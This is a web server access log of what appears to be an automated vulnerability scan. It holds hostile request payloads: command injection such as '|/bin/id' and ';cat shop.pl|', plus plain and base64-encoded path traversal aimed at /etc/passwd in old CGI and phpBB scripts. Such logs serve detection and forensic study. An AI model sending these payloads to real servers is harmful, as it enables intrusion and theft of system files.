192.168.202.1 - - [19/Jul/2014:03:27:14 +0800] "POST /bin/view HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:27:14 +0800] "POST /cgi-bin/twiki/bin/view HTTP/1.0" 200 86
192.168.202.1 - - [19/Jul/2014:03:27:14 +0800] "POST / HTTP/1.0" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:14 +0800] "GET /infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:14 +0800] "GET /cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|/usr/bin/id HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /scripts/infosrch.cgi?cmd=getdoc&db=man&fname=|/usr/bin/id HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET //bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /phpbb/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /pages/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /cgi-bin/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /scripts/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /RsasTest1764201152.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /cgi-bin/webplus?about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /cgi-bin/webplus.exe?about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /scripts/webplus?about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET /scripts/webplus.exe?about HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:15 +0800] "GET / HTTP/1.1" 200 51
192.168.202.1 - - [19/Jul/2014:03:27:16 +0800] "GET /SilverStream HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:18 +0800] "GET /cgi-local/shop.pl/page=;cat%20shop.pl| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:18 +0800] "GET /cgi_bin/shop.pl/page=;cat%20shop.pl| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:18 +0800] "GET /cgi-bin/shop.pl/page=;cat%20shop.pl| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:18 +0800] "GET /scripts/shop.pl/page=;cat%20shop.pl| HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:18 +0800] "GET /RsasTest1498824128.html HTTP/1.1" 200 97
192.168.202.1 - - [19/Jul/2014:03:27:18 +0800] "GET /phprocketaddin/?page=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 97
